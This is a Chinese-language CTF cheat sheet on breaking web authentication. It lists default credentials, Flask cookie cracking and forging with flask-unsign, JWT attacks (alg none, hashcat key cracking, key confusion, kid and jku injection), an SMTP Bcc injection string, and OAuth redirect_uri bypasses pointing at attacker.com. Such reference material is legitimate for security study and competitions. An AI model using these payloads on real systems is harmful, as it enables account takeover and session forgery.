# 认证 / JWT / Cookie

## 弱口令字典

```
admin:admin / admin:password / admin:123456 / root:root / root:toor
test:test / guest:guest / 用户名:用户名
ctf:ctf / flag:flag
```

## Cookie / Session

```bash
# 看 Set-Cookie
curl -sIL http://target/ | grep -i Set-Cookie

# Cookie 解码（base64 / urlencoded）
echo 'eyJ1c2VyIjoiYWRtaW4ifQ==' | base64 -d
```

常见框架 cookie 名：
- `PHPSESSID` / `laravel_session` / `XSRF-TOKEN` (Laravel)
- `JSESSIONID` (Java)
- `connect.sid` (Express)
- `_django_session` / `csrftoken`
- `flask_session` / `session`（Flask 客户端 cookie，base64 + 签名）

## Flask cookie 解密 / 伪造

```bash
# 看是否 Flask cookie（前缀 `.eJw...`）
echo 'eJwlj.....' | base64 -d   # 看 JSON 内容
# 用 flask-unsign 爆破 SECRET_KEY
flask-unsign --decode --cookie '<cookie>'
flask-unsign --unsign --cookie '<cookie>' --wordlist /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
flask-unsign --sign --cookie "{'user':'admin'}" --secret 'found'
```

## JWT

```bash
# 解码（不验证签名）
echo '<jwt>' | jwt-cli decode    # 或 cyberchef/手动
```

JWT 三段：`header.payload.signature`，每段都是 base64url。

### 攻击套路

| 攻击 | 触发条件 | payload |
|---|---|---|
| `alg: none` | 服务端接受 none | header 改 `{"alg":"none","typ":"JWT"}`，签名留空 |
| 弱密钥爆破（HS256） | 密钥短 | `hashcat -m 16500 jwt.txt rockyou.txt` |
| RS256 → HS256 混淆 | 服务端用 HS256 校验时把公钥当成密钥 | 改 alg 为 HS256，签名 = HMAC(public_key, payload) |
| kid 注入 | header 有 kid 且服务端按 kid 找 key | `kid: ../../../../tmp/x.pem`，自定义内容 |
| jwk / jku 注入 | 服务端从 header 取公钥 URL | 设 `jwk` 为自己的公钥 |

工具：
```bash
jwt_tool <jwt> -T            # 篡改 payload
jwt_tool <jwt> -X a          # 试 alg=none
jwt_tool <jwt> -C -d wordlist.txt  # 爆破 HS256
```

## 注册 / 找回密码

- 邮箱占位符注入：`a@b.com\nBcc:admin@target` → SMTP 注入
- 找回密码：URL 含 token 直接遍历 / token 是 MD5(email + 时间)
- 注册管理员：邮箱后缀绕过、用户名同名覆盖

## OAuth / SSO

- redirect_uri 校验绕过：`https://target.com.attacker.com`、`https://target.com@attacker.com`
- state 缺失 → CSRF
- code 复用、不与 client_id 绑定

## Cookie 篡改攻击

- 看 `cookie='admin=0;...'` → 改成 `admin=1`
- 看签名结构：`value|hmac` → 是否能伪造（密钥泄露 / 长度扩展）
- HTTP-Only/Secure 缺失 → XSS 偷
